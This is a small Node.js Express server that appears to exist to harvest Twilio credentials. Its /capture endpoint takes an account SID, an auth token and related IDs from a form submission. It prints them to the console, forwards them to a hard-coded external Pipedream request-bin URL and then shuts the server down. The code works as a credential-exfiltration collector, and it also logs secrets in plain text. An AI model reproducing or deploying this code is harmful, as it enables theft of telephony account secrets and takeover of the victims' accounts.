const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// Middleware to parse URL-encoded and JSON data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Endpoint to capture variables from form submission and send to Pipedream
app.post('/capture', async (req, res) => {
  // Get the variables from the request body
  const payload = {
    TWILIO_OUTBOUND_WORKFLOW_SID: req.body.TWILIO_OUTBOUND_WORKFLOW_SID,
    TWILIO_ACCOUNT_SID: req.body.TWILIO_ACCOUNT_SID,
    TWILIO_AUTH_TOKEN: req.body.TWILIO_AUTH_TOKEN,
    TWILIO_FLEX_WORKSPACE_SID: req.body.TWILIO_FLEX_WORKSPACE_SID,
    EXTERNAL_HOST: req.body.EXTERNAL_HOST,
  };

  // Log the variables for debugging purposes
  console.log('Captured Variables:', payload);

  try {
    // Send captured variables to Pipedream
    await axios.post('https://eo6e159wij477ym.m.pipedream.net/', payload);
    console.log('Variables sent successfully to Pipedream');
  } catch (error) {
    console.error('Error sending variables to Pipedream:', error);
  }

  // Send response back
  res.status(200).send('Variables captured and sent to Pipedream');

  // Exit the server after capturing and sending the variables
  process.exit(0);
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
